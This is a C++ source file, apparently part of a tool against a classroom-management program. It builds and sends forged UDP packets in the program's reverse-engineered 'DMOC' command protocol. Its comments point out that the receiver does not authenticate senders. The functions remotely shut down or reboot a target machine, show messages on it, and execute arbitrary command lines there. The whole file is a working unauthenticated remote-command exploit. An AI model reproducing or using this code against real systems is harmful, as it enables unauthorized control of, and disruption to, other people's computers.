// udp.cpp
// UDP 攻击实现：DMOC 命令协议
//
// 协议逆向自 LibBaseTrans.dll：
//   - SendCommand (0x10009990)：发送端构造报文
//   - CCommandPacketHandler::ProcessPacket (0x100012b0)：接收端校验
//   接收端只校验 "DMOC" 魔数 + 长度 + payload 完整，GUID 不校验。
#include "udp.h"
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

namespace jiyu {

namespace {

// 构造 DMOC 报文（总长度 = payload + 41，末尾补 1 字节以通过接收端长度校验）
std::vector<uint8_t> BuildDmocPacket(uint32_t cmdId, const std::vector<uint8_t>& payload) {
    const size_t headerSize = 0x28;  // 40 字节头
    const size_t total = headerSize + payload.size() + 1;  // 头 + payload + 1 尾部
    std::vector<uint8_t> pkt(total, 0);

    uint32_t magic = 0x434F4D44;      // "DMOC"
    uint32_t ver = 0x00010000;
    uint32_t len13 = (uint32_t)payload.size() + 13;
    uint32_t magic2 = 20000;          // 0x4E20
    uint32_t plen = (uint32_t)payload.size();

    memcpy(&pkt[0x00], &magic, 4);
    memcpy(&pkt[0x04], &ver, 4);
    memcpy(&pkt[0x08], &len13, 4);
    // [0x0c..0x1b] GUID：16 字节全 0（接收端不校验）
    memcpy(&pkt[0x1c], &magic2, 4);
    memcpy(&pkt[0x20], &cmdId, 4);
    memcpy(&pkt[0x24], &plen, 4);
    if (!payload.empty()) {
        memcpy(&pkt[0x28], payload.data(), payload.size());
    }

    return pkt;
}

// 构造 UTF-16 字符串字节（不含结尾 NUL 也补一个）
std::vector<uint8_t> WStrBytes(const std::wstring& s) {
    std::vector<uint8_t> b((s.size() + 1) * 2, 0);
    memcpy(b.data(), s.c_str(), s.size() * 2);
    return b;
}

// 关机/重启 payload：{ DWORD delay; DWORD pad1; DWORD pad2; WCHAR message[] }
std::vector<uint8_t> BuildPowerPayload(uint32_t delaySeconds, const std::wstring& msg) {
    std::vector<uint8_t> payload;
    auto put32 = [&](uint32_t v) {
        payload.push_back((uint8_t)(v & 0xff));
        payload.push_back((uint8_t)((v >> 8) & 0xff));
        payload.push_back((uint8_t)((v >> 16) & 0xff));
        payload.push_back((uint8_t)((v >> 24) & 0xff));
    };
    put32(delaySeconds);  // +0 延时秒数
    put32(0);            // +4 保留
    put32(0);            // +8 保留
    // +0xc message (UTF-16)
    auto mb = WStrBytes(msg);
    payload.insert(payload.end(), mb.begin(), mb.end());
    return payload;
}

// 发消息 payload：{ DWORD f1; DWORD f2; DWORD delay; DWORD text_flag; DWORD pad1; DWORD pad2; WCHAR message[] }
std::vector<uint8_t> BuildMessagePayload(const std::wstring& text) {
    std::vector<uint8_t> payload;
    auto put32 = [&](uint32_t v) {
        payload.push_back((uint8_t)(v & 0xff));
        payload.push_back((uint8_t)((v >> 8) & 0xff));
        payload.push_back((uint8_t)((v >> 16) & 0xff));
        payload.push_back((uint8_t)((v >> 24) & 0xff));
    };
    put32(0);  // +0  flag1
    put32(0);  // +4  flag2
    put32(0);  // +8  delay（0=立即）
    put32(1);  // +0xc text_flag（非 0 表示用自定义文本）
    put32(0);  // +0x10 保留
    put32(0);  // +0x14 保留
    // +0x18 message (UTF-16)
    auto mb = WStrBytes(text);
    payload.insert(payload.end(), mb.begin(), mb.end());
    return payload;
}

} // namespace

bool SendDmocCommand(const std::string& targetIp, uint16_t port,
                     uint32_t cmdId, const std::vector<uint8_t>& payload) {
    if (targetIp.empty() || port == 0) return false;

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return false;

    auto pkt = BuildDmocPacket(cmdId, payload);

    SOCKET s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }

    sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    inet_pton(AF_INET, targetIp.c_str(), &dest.sin_addr);

    int sent = sendto(s, (const char*)pkt.data(), (int)pkt.size(), 0,
                      (sockaddr*)&dest, sizeof(dest));

    closesocket(s);
    WSACleanup();
    return sent > 0;
}

bool SendShutdown(const std::string& ip, uint16_t port, uint32_t delaySeconds, const std::wstring& msg) {
    return SendDmocCommand(ip, port, CMD_SHUTDOWN, BuildPowerPayload(delaySeconds, msg));
}

bool SendReboot(const std::string& ip, uint16_t port, uint32_t delaySeconds, const std::wstring& msg) {
    return SendDmocCommand(ip, port, CMD_REBOOT, BuildPowerPayload(delaySeconds, msg));
}

bool SendTextMessage(const std::string& ip, uint16_t port, const std::wstring& text) {
    return SendDmocCommand(ip, port, CMD_MESSAGE, BuildMessagePayload(text));
}

bool SendExecCommand(const std::string& ip, uint16_t port, const std::wstring& cmdLine) {
    auto mb = WStrBytes(cmdLine);
    return SendDmocCommand(ip, port, CMD_EXEC_COMMAND, mb);
}

} // namespace jiyu
